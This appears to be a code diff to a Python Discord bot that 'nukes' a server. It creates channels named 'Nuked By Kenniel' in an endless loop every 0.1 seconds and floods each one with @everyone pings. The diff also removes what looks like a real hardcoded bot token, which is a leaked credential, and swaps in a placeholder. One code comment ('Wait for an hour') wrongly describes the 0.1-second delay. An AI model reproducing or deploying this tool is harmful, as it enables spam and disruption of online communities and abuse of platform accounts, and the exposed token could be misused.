@@ -9,7 +9,7 @@ from discord.ext import commands
 import asyncio
 
 bot = commands.Bot(command_prefix='.')
-BOT_TOKEN = 'MTEwMzE0MTk2ODI4MTg2MjE4Ng.GNg8SJ.hpCZLOxsB2M_PldbuTDLTmES7E_IFXq90u7PiE'
+BOT_TOKEN = 'TOKEN_HERE'
 
 # Label: Send message every X seconds
 async def send_everyone_message(ctx):
@@ -23,7 +23,7 @@ async def create_new_channel(guild):
     while True:
         new_channel = await guild.create_text_channel(name='Nuked By Kenniel')  #Change Name on (name= 'Change_HERE')
         print(f"Created new channel: {new_channel.name}")
-        await new_channel.send("@everyone") # Send message to the new channel
+        await new_channel.send("@everyone DISCORD_SERVER") # Send message to the new created channel = Nuking...
         await asyncio.sleep(0.1) # Wait for an hour
 
 @bot.command()
